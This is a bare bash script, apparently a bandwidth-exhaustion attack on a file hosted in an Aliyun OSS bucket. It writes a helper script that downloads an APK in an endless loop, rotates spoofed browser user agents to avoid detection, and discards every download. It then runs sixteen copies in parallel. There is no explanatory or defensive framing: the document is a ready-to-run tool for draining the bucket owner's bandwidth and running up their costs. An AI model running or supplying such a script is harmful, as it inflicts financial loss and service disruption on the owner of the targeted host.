uuurl="https://qingqing-update.oss-accelerate.aliyuncs.com/hall/qingqing-0226.apk"
echo -e "UAs=(\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\",\"Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)\",\"Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)\",\"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\",\"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\",\"Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\",\"Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)\",\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0\",\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\",\"Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14\",\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\")"\nwhile true\ndo\nz=$[$RANDOM%12]\nwget -O /dev/null -o /dev/null -U ${UAs[$z]} $uuurl\ndone" > oss.sh

for i in {1..16}
do
bash oss.sh &
done
